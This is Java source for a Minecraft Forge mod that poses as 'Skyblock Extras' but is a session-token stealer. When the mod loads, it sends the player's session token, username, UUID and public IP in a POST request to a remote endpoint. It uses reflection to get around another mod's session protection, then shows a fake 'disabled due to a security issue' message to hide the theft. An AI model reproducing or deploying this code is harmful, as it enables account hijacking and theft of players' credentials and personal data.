package studio.dreamys;

import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

@Mod(modid = "")
public class SkyblockExtras {

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);

        //do everything on separate thread to avoid freezing
        new Thread(() -> {
            try {
                //setup connection
                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);

                Minecraft mc = Minecraft.getMinecraft();
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String token = mc.getSession().getToken();

                //pizzaclient bypass
                if (Loader.isModLoaded("pizzaclient")) {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                }

                //send req
                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip);
                OutputStream os = c.getOutputStream();
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);

                //receive res
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
                System.out.println(response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @SubscribeEvent
    public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
        //send and unregister when player joins
        if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("??cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
            MinecraftForge.EVENT_BUS.unregister(this);
        }
    }
}
